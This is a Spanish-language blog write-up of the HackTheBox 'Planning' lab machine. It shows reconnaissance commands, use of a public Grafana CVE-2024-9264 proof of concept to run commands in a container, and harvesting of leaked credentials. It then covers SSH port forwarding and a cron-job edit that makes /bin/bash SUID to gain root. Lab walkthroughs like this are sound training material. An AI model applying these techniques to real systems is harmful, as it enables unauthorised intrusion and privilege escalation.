---
layout: post
title:  "Writeup Planning"
date:   2025-09-13
categories: [Writeup, HackTheBox]
tags: linux
image: /images/writeup-planning/1.png

---

***Dificultad: Facil***

***Sistema Operativo: Linux***

---------------------------------------------------------
\
plannig es una maquina de dificultad fácil, en la cual se nos dan credenciales como en un pentesting real, las cuales usaremos para explotar un servicio grafana expuesto y desactualizado, mediante la vulnerabilidad **CVE-2024-9264**,  que nos permitirá ejecutar comandos de manera remota en el sistema, pero será un contenedor Docker, el cual gracias a variables de entorno expuestas y filtración de credenciales, podremos pivotar al sistema real, ganando acceso al servidor mediante *ssh* como el usuario enzo. Para la escalada a root, vamos a traer un servicio que se ejecuta en el servidor a nuestra maquina kali con *remote portForwarding* mediante ssh, encontrando credenciales del administrador de ese servicio expuestas en  el sistema, crearemos una tarea cron maliciosa que convertirá la */bin/bash* en un binario *SUID* para ganar privilegios como *ROOT* en nuestra shel

------------------------
\
empezamos creando los directorios de trabajo:
```bash
mkdir nmap content exploits && cd nmap
```

## Reconocimiento:
tenemos credenciales proporcionadas por htb:
```credenciales
admin / 0D5oT70Fq13EvB5r
```

lo primero es hacer el reconocimiento inicial de la ip de la maquina para saber los servicios y donde usar las credenciales:
```bash
nmap -p- -sS -Pn -n -vvv -T4 10.129.242.41 -oN puertos
```

nos dice:
```nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 19:50 CEST
Initiating SYN Stealth Scan at 19:50
Scanning 10.129.242.41 [65535 ports]
Discovered open port 80/tcp on 10.129.242.41
Discovered open port 22/tcp on 10.129.242.41
Completed SYN Stealth Scan at 19:51, 37.61s elapsed (65535 total ports)
Nmap scan report for 10.129.242.41
Host is up, received user-set (0.037s latency).
Scanned at 2025-06-09 19:50:45 CEST for 38s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
tenemos ssh y http

pues veamos cuales son los servicios, las versiones y el sistema operativo que corren en esos puertos:
```bash
nmap -p22,80 -A -n -vvv 10.129.242.41 -oN objetivos
```
*nota: el parámetro -A es una plantilla que combina scripts de reconocimiento, captura de versiones y además descubrimiento de sistema operativo*


como resultado:
```nmap 
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

```
bueno, tenemos un nombre de dominio, http://planning.htb vamos a añadirlo a el localhost

```
10.129.242.41     planning.htb
```

primero vamos a buscar subdominios con la herramienta ffuf:
```bash
 ffuf  -c --fs=178  -w /usr/share/seclists/Discovery/DNS/namelist.txt  -u http://planning.htb -H "Host: FUZZ.planning.htb"
```

después de dejar correr un par de listas de subdominios, esta nos da resultado:
![2](/images/writeup-planning/Pasted image 20250609215021.png)

tenemos un nuevo subdominio: grafana.planning.htb que agregaremos al /etc/hosts

reconocimiento del servidor con whatweb:
```bash
whatweb http://planning.htb
```

nos reporta:
```
http://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.242.41], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]
```
tenemos un mail, y las tecnologías que esta usando el servidor ( la versión de jquery esta desactualizada y vemos que es una pagina de clases online)

quiero hacer un escaneo rapido para ver un poco la estructura de la pagina antes de pasar a la web:
```bash
feroxbuster -u http://planning.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -n -x php
```

nos responde:
<img src="/images/writeup-planning/Pasted image 20250609203037.png" alt="image">

ahora, si vamos a la pagina

<img src="/images/writeup-planning/Pasted image 20250609203310.png" alt="image">

lo que mas llama mi atención es que tenemos un formulario de contacto:

<img src="/images/writeup-planning/Pasted image 20250609203402.png" alt="image">

podría intentar probar algunas cosas, pero primero veamos las url's encontradas

tenemos un /enroll.php:
<img src="/images/writeup-planning/Pasted image 20250609203724.png" alt="image">

es otro formulario en el cual podria probar algunas cosas

voy a capturar estos formularios con burpsutie

al capturar ambos, veo que enroll.php esta procesando datos, pero contact.php es un GET y el formulario no esta enviando nada al servidor

<img src="/images/writeup-planning/Pasted image 20250609205431.png" alt="image">


probando causar errores, malformaciones y respuestas extrañas del servidor con el formulario enroll.php, he conseguido que el servidor la procese mal agregando { en la parte del numero de teléfono:
<img src="/images/writeup-planning/Pasted image 20250609210240.png" alt="image">

pero nada mas allá, esta web no parece tener nada, así que vamos ahora con el subdominio


primero, vamos a identificar sus tecnologías con whatweb:
```
whatweb http://grafana.planning.htb
```

nos muestra:
```
http://grafana.planning.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.242.41], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block], nginx[1.24.0]
http://grafana.planning.htb/login [200 OK] Country[RESERVED][ZZ], Grafana[11.0.0], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.242.41], Script[text/javascript], Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.24.0]
```
 tenemos un login (puede que aquí se usen las credenciales?)

enumerando con feroxbuster:
```
feroxbuster -u http://grafana.planning.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -n -x php
```

tenemos muucho contenido:
<img src="/images/writeup-planning/Pasted image 20250609220819.png" alt="image">
y aunque intentemos acceder a cualquiera, debemos autenticarnos, así que vamos a la web

<img src="/images/writeup-planning/Pasted image 20250609221410.png" alt="image">



probando las credenciales que se nos dan al encender la maquina, funcionan en este panel:
**admin:0D5oT70Fq13EvB5r***

<img src="/images/writeup-planning/Pasted image 20250609221529.png" alt="image">

## CVE-2024-9264

mirando la versión de grafana, y buscando vulnerabilidades relacionadas, encontré la *CVE-2024-9264* y un poc en especifico que incluye la lectura arbitraria de archivos y además la ejecución remota de comandos:
https://github.com/nollium/CVE-2024-9264

y probando el exploit:
<img src="/images/writeup-planning/Pasted image 20250609230249.png" alt="image">

enumerando el sistema, y mirando los hosts, podemos decir que estamos en un entorno docker

este poc, nos sugiere otro comando que he probado:
<img src="/images/writeup-planning/Pasted image 20250609231508.png" alt="image">

solo tenemos:
<img src="/images/writeup-planning/Pasted image 20250609231825.png" alt="image">

## Shell como Enzo

pero, si enumeramos las variables de entorno con *env*:
```bash
python3 exploit.py -u admin -p 0D5oT70Fq13EvB5r -c 'env' http://grafana.planning.htb
```

nos responde:
```
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
SHLVL=0
AWS_AUTH_EXTERNAL_ID=
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana
```

tenemos credenciales! enzo/RioTecRANDEntANT!

si intentamos conectarnos a la maquina por ssh con esas credenciales:
<img src="/images/writeup-planning/Pasted image 20250609232115.png" alt="image">

estamos dentro en la maquina objetivo  y tenemos la flag de usuario


enumerando el entorno, no podemos ejecutar nada como sudo:

<img src="/images/writeup-planning/Pasted image 20250610075152.png" alt="image">

mirando los puertos abiertos y que están en escucha en la maquina con:
```bash
ss -tlp
```

<img src="/images/writeup-planning/Pasted image 20250610080224.png" alt="image">

probando traer algunos puertos expuestos, me encuentro con un inicio de sesión en el puerto 8000:

```bash
ssh -L 6969:127.0.0.1:8000 enzo@10.129.9.144
```

me muestra en el navegador, un panel de inicio de sesión:
<img src="/images/writeup-planning/Pasted image 20250610091227.png" alt="image">


## Shell como Root
pero no tengo credenciales, así que buscando en la maquina archivos con la herramienta *find,* intente buscar archivos de bases de datos, ya que vi que se estaba ejecutando mysql, pero encontré un archivo que llamo mi atención:
```bash
find / -name '*.db' 2>/dev/null
```

<img src="/images/writeup-planning/Pasted image 20250610091533.png" alt="image">

ademas de que si lo abrimos:
```
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

es un archivo en json, que configura unas tareas cron, y además tiene unas credenciales (ya aquí podemos unir algunos puntos) y probando las creds para autenticarme como root en el sistema no funcionan, pero en el panel de inicio de sesión del puerto que trajimos a nuestra maquina de atacantes:

<img src="/images/writeup-planning/Pasted image 20250610091928.png" alt="image">

es una interface grafica para manipular, crear y desplegar tareas cron en el sistema! (vemos las tareas del json que hemos encontrado)

manipulando la crontab *cleanup* dado que se ejecuta cada minuto, quiero volver la /bin/bash suid para tener una shell como root:

<img src="/images/writeup-planning/Pasted image 20250610085700.png" alt="image">

si pulsamos el botón *Run now* y vamos a nuestra shell:

<img src="/images/writeup-planning/Pasted image 20250610085826.png" alt="image">

ya podemos tener la flag de root

------------------------------------------------------
\
nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">